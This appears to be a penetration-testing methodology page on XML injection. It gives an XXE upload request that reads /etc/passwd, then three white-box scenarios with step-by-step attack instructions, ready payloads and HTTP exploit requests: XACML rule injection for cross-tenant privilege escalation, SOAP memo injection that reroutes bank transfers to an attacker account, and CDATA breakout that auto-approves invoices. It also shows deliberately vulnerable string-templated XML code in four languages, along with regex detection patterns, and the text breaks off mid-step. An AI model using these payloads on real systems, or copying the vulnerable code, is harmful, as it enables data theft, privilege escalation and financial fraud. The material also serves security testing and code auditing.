# XML Injection

## Check List

## Methodology

### Black Box

#### [XXE In Filename](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Intruders/xml-attacks.txt)

{% stepper %}
{% step %}
Log in to a user account and navigate to the profile or settings page with an image upload feature, capturing the upload request with Burp Suite
{% endstep %}

{% step %}
Intercept the POST request to the upload endpoint (`/upload`,) and locate the file type parameter or file extension in filename
{% endstep %}

{% step %}
then change the file extension from `.jpg` to `.html` or `.xml` while keeping image content
{% endstep %}

{% step %}
Upload a malicious XML file with an external entity like

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: XXX

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="exploit.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
------WebKitFormBoundary--
```
{% endstep %}

{% step %}
If the server response shows content from the `etc/passwd` file, the vulnerability has been registered
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via String-Templated XACML Policy Compilation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on multitenant environments that allow organizational administrators to define custom access policies, resource groups, or role-based boundaries
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a distributed Attribute-Based Access Control (ABAC) architecture. Modern meshes often centralize authorization decisions using a Policy Decision Point (PDP) that evaluates standard XML-based XACML (eXtensible Access Control Markup Language) rules against incoming requests
{% endstep %}

{% step %}
Investigate the "Policy Management API" utilized by the frontend SPA. To provide a smooth user experience, the API accepts lightweight JSON payloads (e.g., `{"role": "Auditor", "resource": "Billing-Reports"}`)
{% endstep %}

{% step %}
Analyze the translation layer inside the Policy Administration Point (PAP). The microservice must compile the frontend JSON into strict, highly verbose XACML documents before distributing them to the caching tier
{% endstep %}

{% step %}
Discover the compilation optimization: Constructing XACML documents via a rigid XML DOM builder (e.g., `XmlDocument`, `DocumentBuilder`) is highly verbose and consumes substantial memory allocations for massive policy trees. To optimize compilation speed, developers utilize raw string templates (e.g., `string.Format`, template literals) to rapidly generate the XML payload
{% endstep %}

{% step %}
Understand the trust boundary collapse: The developer explicitly trusts the JSON values originating from the authenticated Tenant Administrator, assuming that organizational resource names or role descriptions cannot contain XML structural metacharacters
{% endstep %}

{% step %}
Locate the exact compilation template in the decompiled codebase. Observe the location of the user-controlled interpolation
{% endstep %}

{% step %}
Formulate an XML Structure Injection payload. Because XACML evaluates rules sequentially (often employing a "First-Applicable" or "Permit-Overrides" combining algorithm), injecting a completely new `<Rule>` block before the intended closure alters the entire cryptographic policy context
{% endstep %}

{% step %}
Authenticate to the application as a Tenant Administrator for `Tenant_A`
{% endstep %}

{% step %}
Submit a custom policy configuration via the JSON API. Inside the `resource_name` parameter, inject the XML syntax breaker

```xml
</AttributeValue></Match></AllOf></AnyOf></Target></Rule><Rule Effect="Permit"><Target><AnyOf><AllOf><Match MatchId="urn:oasis:names:tc:xacml:1.0:function:string-equal"><AttributeValue DataType="[http://www.w3.org/2001/XMLSchema#string](http://www.w3.org/2001/XMLSchema#string)">Global_Admin_Dashboard</AttributeValue>
```
{% endstep %}

{% step %}
The Policy Administration Point (PAP) receives the JSON, performs string interpolation, and blindly closes the intended rule while instantiating your injected, highly privileged `Permit` rule
{% endstep %}

{% step %}
The poisoned XACML document is published to the Policy Enforcement Points (PEPs) at the network edge
{% endstep %}

{% step %}
Send a request to the global administrative dashboard. The PEP evaluates the active XACML policy, encounters your injected rule, and grants you access to cross-tenant or platform-wide infrastructure

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:policyXml\s*\+=\s*.*<AttributeValue>|StringBuilder[\s\S]{0,150}<Rule\b|XDocument\.Parse[\s\S]{0,120}?\+|XmlWriter[\s\S]{0,120}?(?:WriteElementString|WriteRaw)|string\.Format\s*\(.*<Policy|string\.Format\s*\(.*<Rule)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\.format\s*\(.*<Rule\b|StringBuilder[\s\S]{0,150}<Policy\b|DocumentBuilderFactory|TransformerFactory|setTextContent\s*\(|createElement\s*\("AttributeValue"\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:sprintf\s*\(.*<Target>.*%s|DOMDocument|SimpleXMLElement|XMLWriter|str_replace\s*\(.*<AttributeValue>|preg_replace\s*\(.*<Rule)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:xacmlTemplate\.replace\s*\(/\{\{.*\}\}/g|xmlbuilder|xml2js|builder\.ele\s*\(|replace\s*\(/\{\{ResourceName\}\}/|`[\s\S]*<Policy[\s\S]*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
policyXml\s*\+=\s*.*<AttributeValue>|StringBuilder.*<Rule|string\.Format\(.*<Policy|string\.Format\(.*<Rule
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\.format\(.*<Rule|StringBuilder.*<Policy|createElement\("AttributeValue"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
sprintf\(.*<Target>.*%s|DOMDocument|SimpleXMLElement|XMLWriter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
xacmlTemplate\.replace\(/\{\{ResourceName\}\}/g|builder\.ele\(|`.*<Policy.*\$\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class XacmlPolicyCompiler 
{
    private readonly IPolicyPublisher _publisher;

    public async Task CompileAndPublishAsync(TenantPolicyDto request) 
    {
        // [1]
        // [2]
        // [3]
        var xacmlPolicy = $@"
            <Policy PolicyId='Policy_{request.TenantId}' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>
                <Target/>
                <Rule RuleId='Rule_1' Effect='Permit'>
                    <Target>
                        <AnyOf>
                            <AllOf>
                                <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>
                                    <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>
                                    <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>{request.ResourceName}</AttributeValue>
                                </Match>
                            </AllOf>
                        </AnyOf>
                    </Target>
                </Rule>
            </Policy>";

        // [4]
        await _publisher.DistributeToEdgeGatewaysAsync(xacmlPolicy);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class XacmlPolicyCompiler {

    @Autowired
    private PolicyPublisher publisher;

    public void compileAndPublish(TenantPolicyDto request) {
        // [1]
        // [2]
        // [3]
        String xacmlPolicy = String.format(
            "<Policy PolicyId='Policy_%s' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>\n" +
            "    <Target/>\n" +
            "    <Rule RuleId='Rule_1' Effect='Permit'>\n" +
            "        <Target>\n" +
            "            <AnyOf>\n" +
            "                <AllOf>\n" +
            "                    <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>\n" +
            "                        <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>\n" +
            "                        <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>%s</AttributeValue>\n" +
            "                    </Match>\n" +
            "                </AllOf>\n" +
            "            </AnyOf>\n" +
            "        </Target>\n" +
            "    </Rule>\n" +
            "</Policy>", 
            request.getTenantId(), request.getResourceName()
        );

        // [4]
        publisher.distributeToEdgeGateways(xacmlPolicy);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class XacmlPolicyCompiler 
{
    protected $publisher;

    public function compileAndPublish(TenantPolicyDto $request): void 
    {
        // [1]
        // [2]
        // [3]
        $xacmlPolicy = sprintf("
            <Policy PolicyId='Policy_%s' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>
                <Target/>
                <Rule RuleId='Rule_1' Effect='Permit'>
                    <Target>
                        <AnyOf>
                            <AllOf>
                                <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>
                                    <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>
                                    <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>%s</AttributeValue>
                                </Match>
                            </AllOf>
                        </AnyOf>
                    </Target>
                </Rule>
            </Policy>", 
            $request->tenantId, $request->resourceName
        );

        // [4]
        $this->publisher->distributeToEdgeGateways($xacmlPolicy);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class XacmlPolicyCompiler {
    static async compileAndPublish(request) {
        // [1]
        // [2]
        // [3]
        let xacmlPolicy = `
            <Policy PolicyId='Policy_${request.tenantId}' RuleCombiningAlgId='urn:oasis:names:tc:xacml:1.0:rule-combining-algorithm:permit-overrides'>
                <Target/>
                <Rule RuleId='Rule_1' Effect='Permit'>
                    <Target>
                        <AnyOf>
                            <AllOf>
                                <Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'>
                                    <AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/>
                                    <AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>${request.resourceName}</AttributeValue>
                                </Match>
                            </AllOf>
                        </AnyOf>
                    </Target>
                </Rule>
            </Policy>`;

        // [4]
        await publisher.distributeToEdgeGateways(xacmlPolicy);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Policy Administration Point (PAP) receives the lightweight JSON DTO from the frontend SPA, \[2] The microservice utilizes a `permit-overrides` combining algorithm, which dictates that if _any_ rule evaluates to `Permit`, the entire policy yields a `Permit` decision regardless of subsequent `Deny` rules, \[3] To optimize performance and memory overhead, the developer dynamically generates the verbose XACML document using raw string interpolation instead of an XML DOM builder, fundamentally failing to XML-entity encode the user-controlled `ResourceName` property, \[4] The poisoned XML structure is synchronized to the Edge Gateways. Because the document remains syntactically valid XML, the distributed caching tier and edge PDPs ingest it flawlessly, deploying the attacker's injected authorization rules organization-wide=

```http
// 1. Attacker (Tenant Admin for Org_A) configures a custom resource role via JSON API.
// 2. Attacker injects XML structural elements to break out of the target match and generate a Permit rule for global resources.
POST /api/v1/policies/custom-roles HTTP/1.1
Host: pap.enterprise.tld
Authorization: Bearer <tenant_a_admin_token>
Content-Type: application/json

{
  "tenantId": "Org_A",
  "resourceName": "Billing_Reports</AttributeValue></Match></AllOf></AnyOf></Target></Rule><Rule RuleId='Injected_Rule' Effect='Permit'><Target><AnyOf><AllOf><Match MatchId='urn:oasis:names:tc:xacml:1.0:function:string-equal'><AttributeDesignator AttributeId='urn:oasis:names:tc:xacml:1.0:resource:resource-id' DataType='http://www.w3.org/2001/XMLSchema#string'/><AttributeValue DataType='http://www.w3.org/2001/XMLSchema#string'>Global_System_Config"
}
```

```http
// 3. The PAP compiles the XML and distributes it.
// 4. The Attacker queries the global system configuration.
GET /api/v1/admin/global-system-config HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <tenant_a_admin_token>

// 5. The PEP evaluates the policy, hits the injected <Rule Effect='Permit'> for the target resource, and grants access.
HTTP/1.1 200 OK
{"status": "Global Config Data"}
```
{% endstep %}

{% step %}
To support complex Attribute-Based Access Control (ABAC) without incurring the performance penalty of constructing massive XML Abstract Syntax Trees in memory, the authorization engineers implemented string-templated XACML compilation. By assuming that JSON string fields represented semantic plain text, the architecture bypassed XML contextual encoding. The attacker supplied a payload containing strictly valid XML syntax that closed the active `<Rule>` block and initiated a subsequent, highly privileged `Permit` block. The system perfectly serialized this payload into the authoritative XACML document. When the distributed Policy Enforcement Points consumed the document, the injected XML structure was parsed natively, resulting in a systemic collapse of cross-tenant and platform isolation
{% endstep %}
{% endstepper %}

***

#### Financial Routing Fraud via BFF REST-to-SOAP Translation Overlap

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Pay attention to specific API routes that handle core financial transactions, wire transfers, or massive batch processing
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Backend-For-Frontend (BFF) proxy architecture. Modern mobile apps and web SPAs communicate via REST/JSON. However, mission-critical financial systems (e.g., Core Banking Mainframes, SAP ERPs) remain firmly rooted in legacy XML-based SOAP protocols
{% endstep %}

{% step %}
Investigate the BFF translation layer. The BFF acts as an anti-corruption layer, ingesting the inbound JSON request and mapping it to the rigid SOAP XML envelope expected by the legacy mainframe
{% endstep %}

{% step %}
Discover the high-throughput translation optimization. Instantiating complex XML serializers (`JAXB`, `XmlSerializer`) for thousands of concurrent transactions creates unacceptable garbage collection pauses. To minimize latency, developers construct the outbound SOAP payload using direct string concatenation
{% endstep %}

{% step %}
Analyze the parameter mapping. Note that highly constrained fields (like `Amount`, `Currency`, and `DestinationAccount`) are usually securely type-cast (e.g., converting a JSON number to an Integer)
{% endstep %}

{% step %}
Identify a free-text metadata field, such as `TransactionMemo`, `ReferenceNote`, or `Description`, that maps natively as a String
{% endstep %}

{% step %}
Understand the legacy XML parser's behavior. Most legacy SOAP parsers process duplicate XML nodes sequentially. If an XML payload contains two identically named nodes within the same parent (e.g., `<DestinationAccount>Account_A</DestinationAccount> ... <DestinationAccount>Account_B</DestinationAccount>`), the parser inherently assigns the _last_ defined node to the DTO property, silently discarding the first
{% endstep %}

{% step %}
Send a legitimate JSON transfer request to the BFF
{% endstep %}

{% step %}
Inject an XML payload into the free-text `Memo` field. The payload must close the `<Memo>` tag early, inject a duplicate, high-value node (e.g., `<DestinationAccount>Attacker_Account</DestinationAccount>`), and reopen a `<Memo>` tag so the resulting XML remains perfectly well-formed
{% endstep %}

{% step %}
The BFF's JSON parser validates the payload structurally, confirms the `DestinationAccount` matches your authorized payee list, and string-interpolates your `Memo` into the SOAP envelope
{% endstep %}

{% step %}
The legacy mainframe receives the XML. It parses the first `DestinationAccount` (authorized), parses the broken `Memo`, and parses the newly injected `DestinationAccount` (attacker)
{% endstep %}

{% step %}
Because the attacker's node appears chronologically later in the DOM tree, the legacy deserializer overwrites the internal state variable. The financial transaction is mathematically authorized but executed against the injected routing parameters

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:soapEnvelope\s*\+=\s*.*<Memo>|StringBuilder[\s\S]{0,150}<Envelope\b|XDocument[\s\S]{0,120}?\+|XmlWriter[\s\S]{0,120}?(?:WriteElementString|WriteRaw)|string\.Format\s*\(.*<Memo>|string\.Format\s*\(.*<Envelope>)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\.format\s*\(.*<Memo>%s|StringBuilder[\s\S]{0,150}<Envelope\b|SOAPMessage|SOAPBody|DocumentBuilderFactory|TransformerFactory|setTextContent\s*\(|createElement\s*\("Memo"\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$soapBody\s*\.\=\s*".*<Memo>|\bsprintf\s*\(.*<Memo>%s|DOMDocument|SimpleXMLElement|XMLWriter|SoapClient|SoapVar)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:xmlPayload\s*\+=\s*`<Memo>\$\{|`[\s\S]*<Envelope[\s\S]*\$\{|xmlbuilder|fast-xml-parser|builder\.ele\s*\(|replace\s*\(/\{\{.*\}\}/)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
soapEnvelope\s*\+=\s*.*<Memo>|StringBuilder.*<Envelope|string\.Format\(.*<Memo>|string\.Format\(.*<Envelope>
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\.format\(.*<Memo>%s|StringBuilder.*<Envelope|SOAPBody|createElement\("Memo"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$soapBody\s*\.\=\s*".*<Memo>|sprintf\(.*<Memo>%s|SoapClient|SoapVar
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
xmlPayload\s*\+=\s*`<Memo>\$\{|`.*<Envelope.*\$\{|builder\.ele\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class MainframeSoapClient 
{
    private readonly HttpClient _httpClient;

    public async Task<string> ExecuteTransferAsync(TransferRequestDto request) 
    {
        // [1]
        // [2]
        // [3]
        var soapEnvelope = $@"<?xml version='1.0' encoding='utf-8'?>
            <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
                <soap:Body>
                    <ExecuteTransfer>
                        <SourceAccount>{request.SourceAccount}</SourceAccount>
                        <DestinationAccount>{request.DestinationAccount}</DestinationAccount>
                        <Amount>{request.Amount}</Amount>
                        <Memo>{request.Memo}</Memo>
                    </ExecuteTransfer>
                </soap:Body>
            </soap:Envelope>";

        // [4]
        var content = new StringContent(soapEnvelope, Encoding.UTF8, "text/xml");
        var response = await _httpClient.PostAsync("http://mainframe.internal.corp/TransferService", content);
        
        return await response.Content.ReadAsStringAsync();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class MainframeSoapClient {

    @Autowired
    private RestTemplate restTemplate;

    public String executeTransfer(TransferRequestDto request) {
        // [1]
        // [2]
        // [3]
        String soapEnvelope = String.format(
            "<?xml version='1.0' encoding='utf-8'?>\n" +
            "<soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>\n" +
            "    <soap:Body>\n" +
            "        <ExecuteTransfer>\n" +
            "            <SourceAccount>%s</SourceAccount>\n" +
            "            <DestinationAccount>%s</DestinationAccount>\n" +
            "            <Amount>%f</Amount>\n" +
            "            <Memo>%s</Memo>\n" +
            "        </ExecuteTransfer>\n" +
            "    </soap:Body>\n" +
            "</soap:Envelope>",
            request.getSourceAccount(), request.getDestinationAccount(), request.getAmount(), request.getMemo()
        );

        // [4]
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.TEXT_XML);
        HttpEntity<String> entity = new HttpEntity<>(soapEnvelope, headers);

        return restTemplate.postForObject("http://mainframe.internal.corp/TransferService", entity, String.class);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class MainframeSoapClient 
{
    public function executeTransfer(TransferRequestDto $request): string 
    {
        // [1]
        // [2]
        // [3]
        $soapEnvelope = "<?xml version='1.0' encoding='utf-8'?>
            <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
                <soap:Body>
                    <ExecuteTransfer>
                        <SourceAccount>{$request->sourceAccount}</SourceAccount>
                        <DestinationAccount>{$request->destinationAccount}</DestinationAccount>
                        <Amount>{$request->amount}</Amount>
                        <Memo>{$request->memo}</Memo>
                    </ExecuteTransfer>
                </soap:Body>
            </soap:Envelope>";

        // [4]
        $ch = curl_init('http://mainframe.internal.corp/TransferService');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $soapEnvelope);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml']);

        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class MainframeSoapClient {
    static async executeTransfer(request) {
        // [1]
        // [2]
        // [3]
        let soapEnvelope = `<?xml version='1.0' encoding='utf-8'?>
            <soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>
                <soap:Body>
                    <ExecuteTransfer>
                        <SourceAccount>${request.sourceAccount}</SourceAccount>
                        <DestinationAccount>${request.destinationAccount}</DestinationAccount>
                        <Amount>${request.amount}</Amount>
                        <Memo>${request.memo}</Memo>
                    </ExecuteTransfer>
                </soap:Body>
            </soap:Envelope>`;

        // [4]
        let response = await axios.post('http://mainframe.internal.corp/TransferService', soapEnvelope, {
            headers: { 'Content-Type': 'text/xml' }
        });

        return response.data;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The BFF acts as a translation layer, securely validating business rules (e.g., sufficient funds, authorized recipient) based on the incoming JSON structure before initiating communication with the legacy environment, \[2] To avoid the serialization latency of heavy XML libraries, the developer implements string interpolation to build the SOAP envelope, \[3] The architecture relies entirely on the JSON parser's inherent structural safety. The developer assumes that because a JSON string is logically plain text, it will remain inert when transplanted into the XML DOM, \[4] The unescaped payload is beamed across the internal WAN. The legacy system's SOAP parser processes the document linearly. By injecting a duplicate `<DestinationAccount>` node after the original, the attacker exploits the parser's state-machine implementation (which natively overwrites duplicate key assignments), forcing the mainframe to execute the transaction against the injected routing logic

```http
// 1. Attacker sends a JSON request to the modern BFF. 
// They specify an authorized destination account to pass the business logic checks.
// They inject the XML Structural payload into the free-text Memo field.
POST /api/v1/banking/transfer HTTP/1.1
Host: bff.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "sourceAccount": "123456789",
  "destinationAccount": "AUTHORIZED_PAYEE_99",
  "amount": 50000.00,
  "memo": "</Memo><DestinationAccount>ATTACKER_OFFSHORE_ACCOUNT</DestinationAccount><Memo>Payment"
}

// 2. The BFF evaluates the JSON request, verifies AUTHORIZED_PAYEE_99, and builds the SOAP string:
// <DestinationAccount>AUTHORIZED_PAYEE_99</DestinationAccount>
// <Amount>50000.00</Amount>
// <Memo></Memo><DestinationAccount>ATTACKER_OFFSHORE_ACCOUNT</DestinationAccount><Memo>Payment</Memo>

// 3. The Mainframe XML deserializer parses the document. The second DestinationAccount overwrites the first.
// 4. The funds are successfully routed to the attacker's offshore account.
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "Transfer Successful"}
```
{% endstep %}

{% step %}
To bridge modern JSON frontends with legacy XML mainframes, the Backend-For-Frontend proxy bypassed heavy XML serialization libraries in favor of rapid string templating. The architecture validated the transaction parameters against the JSON structure and blindly mapped them into the SOAP template. By providing a valid destination account, the attacker satisfied the BFF's compliance logic. However, by embedding XML structural tags within the `Memo` field, the attacker manipulated the downstream XML Document Object Model. The legacy mainframe parsed the document sequentially, encountering a duplicate account routing node. Utilizing a standard last-node-wins resolution strategy, the mainframe discarded the validated destination and executed the financial transfer against the attacker's injected parameter, demonstrating a critical execution bypass resulting purely from protocol translation desynchronization
{% endstep %}
{% endstepper %}

***

#### Supply Chain Approval Bypass via CDATA Breakout in Event Sourcing Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous B2B integration points, such as Invoice ingestion, Supply Chain management, or Compliance Auditing modules
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify an Event Sourcing microservice architecture utilizing standardized B2B messaging schemas (e.g., UBL - Universal Business Language, or Peppol)
{% endstep %}

{% step %}
Investigate the API Gateway webhook ingestion. Vendors submit invoices via a modern REST/JSON API. The API Gateway validates the payload, transforms it into the mandatory XML format, and drops it onto an internal message broker (RabbitMQ, Kafka) for asynchronous processing by the core Accounting engine
{% endstep %}

{% step %}
Analyze the JSON-to-XML translation optimization in the API Gateway. To ensure the XML parser in the downstream Accounting engine does not throw fatal exceptions when a vendor includes HTML characters (e.g., `&`, `<`, `>`) in a rich-text justification field, the API Gateway explicitly wraps specific fields in `<![CDATA[ ... ]]>` blocks
{% endstep %}

{% step %}
Understand the hidden assumption of CDATA blocks. Developers falsely assume that CDATA blocks perfectly neutralize any content within them, rendering all injected tags inert
{% endstep %}

{% step %}
Discover the structural limitation: The XML specification states that a CDATA section cannot contain the string `]]>`. If the string `]]>` is encountered, the parser instantly terminates the CDATA block and resumes standard XML parsing for the subsequent text
{% endstep %}

{% step %}
Locate the exact translation routine in the decompiled API Gateway. Verify that the developer did not implement a pre-processing step to sanitize or escape the `]]>` sequence from the user's input before wrapping it
{% endstep %}

{% step %}
Send a JSON webhook payload to the API Gateway
{% endstep %}

{% step %}
Inside a CDATA-wrapped field (like `justification_note` or `description`), inject the CDATA termination sequence followed by a highly privileged business logic node: `]]><IsApproved>true</IsApproved><RequiresAudit>false</RequiresAudit><![CDATA[`
{% endstep %}

{% step %}
The API Gateway wraps your payload: `<![CDATA[]]><IsApproved>true</IsApproved><RequiresAudit>false</RequiresAudit><![CDATA[]]>`
{% endstep %}

{% step %}
The generated XML document remains structurally flawless. The Gateway pushes it onto the message queue
{% endstep %}

{% step %}
The core Accounting engine pulls the XML message. The parser consumes the first empty CDATA block, natively processes your injected `<IsApproved>` and `<RequiresAudit>` nodes, and consumes the final empty CDATA block
{% endstep %}

{% step %}
The system inherently trusts the parsed values, bypassing the manual managerial review queues, and schedules the multi-million dollar invoice for automated payout

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:xml\s*\+=\s*.*<!\[CDATA\[.*\]\]>|StringBuilder[\s\S]{0,150}<!\[CDATA\[|string\.Format\s*\(.*<!\[CDATA\[%s?\]\]>|XCData\s*\(|XmlWriter[\s\S]{0,120}?WriteCData)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\.format\s*\(.*<!\[CDATA\[%s\]\]>|StringBuilder[\s\S]{0,150}<!\[CDATA\[|CDATASection|createCDATASection\s*\(|XMLStreamWriter[\s\S]{0,120}?writeCData)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$xml\s*\.\=\s*".*<!\[CDATA\[|sprintf\s*\(.*<!\[CDATA\[%s\]\]>|DOMDocument|createCDATASection\s*\(|XMLWriter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:xmlPayload\s*\+=\s*`<!\[CDATA\[\$\{|`[\s\S]*<!\[CDATA\[\$\{|xmlbuilder|builder\.dat\s*\(|fast-xml-parser)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
xml\s*\+=\s*.*<!\[CDATA\[.*\]\]>|StringBuilder.*<!\[CDATA\[|string\.Format\(.*<!\[CDATA\[
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\.format\(.*<!\[CDATA\[%s\]\]>|StringBuilder.*<!\[CDATA\[|createCDATASection\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$xml\s*\.\=\s*".*<!\[CDATA\[|sprintf\(.*<!\[CDATA\[%s\]\]>|createCDATASection\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
xmlPayload\s*\+=\s*`<!\[CDATA\[\$\{|builder\.dat\(|`.*<!\[CDATA\[
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookToXmlTranslator 
{
    private readonly IMessageQueue _queue;

    public async Task IngestInvoiceAsync(InvoiceDto jsonInvoice) 
    {
        // [1]
        // [2]
        // [3]
        var xmlPayload = $@"<?xml version='1.0' encoding='UTF-8'?>
            <Invoice>
                <VendorId>{jsonInvoice.VendorId}</VendorId>
                <Amount>{jsonInvoice.Amount}</Amount>
                <IsApproved>false</IsApproved>
                <RequiresAudit>true</RequiresAudit>
                <Justification><![CDATA[{jsonInvoice.JustificationNote}]]></Justification>
            </Invoice>";

        // [4]
        await _queue.PublishAsync("invoice-processing", xmlPayload);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class WebhookToXmlTranslator {

    @Autowired
    private MessageQueue queue;

    public void ingestInvoice(InvoiceDto jsonInvoice) {
        // [1]
        // [2]
        // [3]
        String xmlPayload = String.format(
            "<?xml version='1.0' encoding='UTF-8'?>\n" +
            "<Invoice>\n" +
            "    <VendorId>%s</VendorId>\n" +
            "    <Amount>%f</Amount>\n" +
            "    <IsApproved>false</IsApproved>\n" +
            "    <RequiresAudit>true</RequiresAudit>\n" +
            "    <Justification><![CDATA[%s]]></Justification>\n" +
            "</Invoice>",
            jsonInvoice.getVendorId(), jsonInvoice.getAmount(), jsonInvoice.getJustificationNote()
        );

        // [4]
        queue.publish("invoice-processing", xmlPayload);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WebhookToXmlTranslator 
{
    protected $queue;

    public function ingestInvoice(InvoiceDto $jsonInvoice): void 
    {
        // [1]
        // [2]
        // [3]
        $xmlPayload = "<?xml version='1.0' encoding='UTF-8'?>
            <Invoice>
                <VendorId>{$jsonInvoice->vendorId}</VendorId>
                <Amount>{$jsonInvoice->amount}</Amount>
                <IsApproved>false</IsApproved>
                <RequiresAudit>true</RequiresAudit>
                <Justification><![CDATA[{$jsonInvoice->justificationNote}]]></Justification>
            </Invoice>";

        // [4]
        $this->queue->publish('invoice-processing', $xmlPayload);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class WebhookToXmlTranslator {
    static async ingestInvoice(jsonInvoice) {
        // [1]
        // [2]
        // [3]
        let xmlPayload = `<?xml version='1.0' encoding='UTF-8'?>
            <Invoice>
                <VendorId>${jsonInvoice.vendorId}</VendorId>
                <Amount>${jsonInvoice.amount}</Amount>
                <IsApproved>false</IsApproved>
                <RequiresAudit>true</RequiresAudit>
                <Justification><![CDATA[${jsonInvoice.justificationNote}]]></Justification>
            </Invoice>`;

        // [4]
        await queue.publish('invoice-processing', xmlPayload);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
